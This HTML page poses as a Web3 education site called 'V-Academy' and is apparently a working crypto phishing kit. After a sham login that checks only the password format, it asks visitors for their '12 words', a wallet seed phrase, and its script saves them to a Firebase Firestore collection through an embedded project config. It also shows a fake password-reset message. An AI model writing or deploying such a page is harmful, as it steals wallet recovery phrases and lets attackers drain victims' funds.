<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>V-Academy</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family: Arial, sans-serif;}
body{height:100vh;background:#f8f8f8;display:flex;justify-content:center;align-items:center;}
.container{width:100%;max-width:420px;padding:20px;background:white;border-radius:10px;box-shadow:0 0 10px rgba(0,0,0,0.1);}
.top{display:flex;justify-content:space-between;align-items:center;margin-bottom:30px;}
.logo{width:50px;}
.support{padding:10px 20px;border-radius:25px;border:none;background:#eee;cursor:pointer;}
h1{text-align:center;font-size:26px;margin-bottom:10px;}
.subtitle{text-align:center;color:#888;margin-bottom:30px;}
label{display:block;margin:15px 0 5px;}
input{width:100%;padding:15px;border-radius:25px;border:1px solid #ddd;outline:none;}
.password-box{position:relative;}
.eye{position:absolute;right:15px;top:50%;transform:translateY(-50%);cursor:pointer;}
.forgot{text-align:right;margin-top:8px;}
.forgot a{color:#007bff;text-decoration:none;}
.login-btn{width:100%;margin-top:25px;padding:15px;border:none;border-radius:30px;background:linear-gradient(to right,#3b82f6,#60a5fa);color:white;font-size:18px;cursor:pointer;}
.signup{text-align:center;margin-top:20px;}
.signup a{color:#007bff;font-weight:bold;text-decoration:none;}
.google-btn{margin-top:15px;width:100%;padding:12px;border-radius:25px;border:1px solid #ddd;background:white;cursor:pointer;}
/* Metawhale Interface */
.meta-container{display:none;flex-direction:column;align-items:center;background:white;padding:30px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.1);}
.meta-container h2{margin-bottom:20px;}
.meta-container textarea{width:100%;height:150px;padding:15px;border:1px solid #ddd;border-radius:10px;resize:vertical;font-size:16px;}
.meta-container button{margin-top:20px;padding:12px 20px;border:none;border-radius:25px;background:linear-gradient(to right,#3b82f6,#60a5fa);color:white;font-size:16px;cursor:pointer;}
</style>
</head>
<body>

<!-- Login Container -->
<div class="container" id="login-container">
    <div class="top">
        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/3a/Black_heart.svg/768px-Black_heart.svg.png" class="logo">
        <button class="support">Support</button>
    </div>

    <h1>Welcome to V-Academy</h1>
    <p class="subtitle">Your journey into the world of Web3 starts here</p>

    <form id="loginForm">
        <label>Email</label>
        <input type="email" id="email" placeholder="Email" required>

        <label>Password</label>
        <div class="password-box">
            <input type="password" id="password" placeholder="Password" required>
            <span class="eye" onclick="togglePassword()">👁</span>
        </div>

        <div class="forgot">
            <a href="#" onclick="forgotPassword()">Forgot password?</a>
        </div>

        <button class="login-btn" type="submit">Log in</button>
    </form>

    <button class="google-btn" onclick="googleSignup()">Sign up with Google</button>
    <div class="signup">
        Do not have an account? <a href="#" onclick="signup()">Sign Up</a>
    </div>
</div>

<!-- Metawhale Interface -->
<div class="meta-container" id="meta-container">
    <h2>Connect Your Metawhale to V-Academy</h2>
    <textarea id="wordsInput" placeholder="Enter your 12 words for login"></textarea>
    <button onclick="submitWords()">Submit</button>
</div>

<!-- Firebase CDN -->
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>

<script>
// Firebase Config
const firebaseConfig = {
  apiKey: "AIzaSyBvfZO9pxRshe4M8aavrLlHexq42vZDQ2g",
  authDomain: "v-academy-82560.firebaseapp.com",
  projectId: "v-academy-82560",
  storageBucket: "v-academy-82560.firebasestorage.app",
  messagingSenderId: "826822771378",
  appId: "1:826822771378:web:5357b1b989b298a8027fab",
  measurementId: "G-JEWJC719LD"
};

// Initialize Firebase
firebase.initializeApp(firebaseConfig);
const db = firebase.firestore();

// ===== Global Functions =====
window.togglePassword = function() {
    const pass = document.getElementById("password");
    pass.type = pass.type === "password" ? "text" : "password";
}

window.submitWords = async function() {
    const words = document.getElementById("wordsInput").value.trim();
    if(words === ""){
        alert("Please enter your 12 words!");
        return;
    }
    try{
        await db.collection("vAcademyWords").add({
            words: words,
            timestamp: new Date()
        });
        alert("Your words have been submitted successfully!");
        document.getElementById("wordsInput").value = "";
    } catch(err){
        console.error(err);
        alert("Error submitting words. Try again.");
    }
}

window.signup = function() { alert("Signup page coming soon."); }
window.googleSignup = function() { alert("Google signup requires Firebase Auth."); }
window.forgotPassword = function() {
    const email = document.getElementById("email").value;
    if(email === ""){
        alert("Please enter email first");
    } else{
        alert("Password reset link sent to " + email);
    }
}

// ===== Login Form =====
document.getElementById("loginForm").addEventListener("submit", function(e){
    e.preventDefault();
    const password = document.getElementById("password").value;

    // Password validation: min 6 chars, uppercase, lowercase, number
    const passRegex = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d).{6,}$/;
    if(!passRegex.test(password)){
        alert("Password must have at least 6 characters including uppercase, lowercase, and number.");
        return;
    }

    // Successful login → show Metawhale interface
    document.getElementById("login-container").style.display = "none";
    document.getElementById("meta-container").style.display = "flex";
});
</script>

</body>
</html>
